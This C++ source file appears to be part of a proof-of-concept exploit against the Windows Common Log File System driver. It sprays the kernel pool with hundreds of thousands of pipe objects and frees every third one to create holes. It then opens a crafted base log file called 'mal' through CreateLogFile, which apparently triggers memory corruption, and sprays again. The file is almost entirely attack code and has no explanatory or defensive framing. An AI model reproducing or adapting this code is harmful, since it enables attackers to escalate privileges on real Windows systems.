#pragma warning (disable : 4005)

#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "crc32.h"  
#include "head.h"  
#include "ntos.h"  
#include "pipe_utils.h"
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")

int main() {
	
	//CloseHandle(hLogFile);
	for (int i = 0; i < 0x40000; i++) {
		if (!CreatePipeObject(i)) {
			printf("[-] CreatePipeObject failed for index %d\n", i);
			return 1;
		}
	}
	for (int i = 0; i < 0x20000; i++) {
		if (!CreatePipeObject(i)) {
			return 1;
		}
	}

	// Delete Pipe 
	for (int i = 0; i < 0x20000; i += 3) {
		if (ReadPipe[i] != NULL) {
			CloseHandle(ReadPipe[i]);
			ReadPipe[i] = NULL;
		}
		if (WritePipe[i] != NULL) {
			CloseHandle(WritePipe[i]);
			WritePipe[i] = NULL;
		}
	}
	

	// open base log file
	std::wstring logFileName = L"LOG:";
	std::wstring inputName = L"C:\\Users\\vuduc\\Desktop\\mal";
	logFileName += inputName;
	HANDLE hLogFile = CreateLogFile(logFileName.c_str(), 0xc0010000, 3, 0, 4, 0);
	if (hLogFile == INVALID_HANDLE_VALUE) {
		printf("CreateLogFile failed with error %d\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] Log file created successfully.\n");
	}

	for (int i = 0; i < 0x20000; i++) {
		if (!CreatePipeObject(i)) {
			return 1;
		}
	}

	getchar();
}